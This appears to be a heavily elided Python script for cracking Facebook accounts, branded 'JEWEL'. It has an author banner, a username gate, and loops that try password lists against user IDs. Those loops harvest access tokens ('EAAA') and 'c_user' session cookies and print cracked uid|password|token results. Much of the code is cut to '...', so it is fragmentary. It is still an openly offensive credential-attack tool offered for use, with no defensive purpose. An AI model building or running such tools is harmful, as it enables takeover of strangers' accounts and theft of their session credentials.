...
def logo():
	...
	print("""\x1b[0;32m╔════════════════════════════════════════════╗
jalan \x1b[0;33m║WELCOME TO MY TOOLS  [JEWEL TERITORY].  ║
jalan \x1b[0;33m║       #TOOL AUTHOR [JEWEL FUNDS]. ║
jalan \x1b[0;33m╚════════════════════════════════════════════╝
\x1b[0;33m ---------------------------------------------
\x1b[0;33m╔════════════════════════════════════════════╗
\x1b[0;33m║JEWEL FUNDS 𝙸𝚖 𝚗𝚘𝚝 𝚋𝚊𝚍 𝚒𝚖 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚍𝚊𝚍 ║
\x1b[0;33m║#FACEBOOK : NAME [JEWEL FUNDS  II ].       ║
\x1b[0;33m║#GITHUB : https://github.com/JEWEL FUNDS   ║
\x1b[0;33m║#WHATSAPP : 090**********                   ║
\x1b[0;33m╚════════════════════════════════════════════╝""")
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-open https://wa.me/09055012862.I.AM.HACKER.Im.silent')
    else:
...
def method():
	...
	print("\033[1;93m[\033[1;94m1\033[1;97m] B-API\033[1;97m [ \033[1;95mJEWEL PRO/FASTER \033[1;97m]")
...
def cek_ttl_cp(uid, pw):
	...
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\033[0;95m[JEWEL-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
	...
	try:
		...
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;94m[JEWEL-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				...
				print("\r\033[0;95m[JEWEL-CP] %s|%s\033[0;92m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[JEWEL-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[JEWEL-CP] %s|%s\033[0;96m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[JEWEL-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[JEWEL-CP] %s|%s\033[0;91m        "%(uid, pw))
